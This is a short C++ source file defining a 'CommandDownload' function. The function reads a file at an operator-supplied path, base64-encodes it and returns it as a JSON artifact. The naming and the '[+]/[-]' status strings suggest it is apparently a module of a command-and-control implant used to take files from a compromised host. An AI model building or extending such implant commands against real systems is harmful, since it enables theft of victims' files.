#include "Command.h"

#include "Stdlib.h"

BOOL CommandDownload(json& args, string artifact, json& result) {
    LPVOID  data        = NULL;
    DWORD   size        = 0; 
    CHAR*   b64data     = NULL;
    string  path        = args[0].get<string>();
    json    file        = json::object();

    if (!FsFileRead(path.c_str(), &data, &size)) {
        result["output"] = "[-] file not found";
        return FALSE;
    }

    b64data = Base64Encode((BYTE*)data, size);
    if (b64data == NULL) {
        result["output"] = "[-] failed to base64 encode the file";
        return FALSE;
    }

    file["name"] = path.c_str();
    file["size"] = size;
    file["data"] = b64data;

    result["output"]    = "[+] file downloaded";
    result["artifact"]  = file.dump();

    return TRUE;
}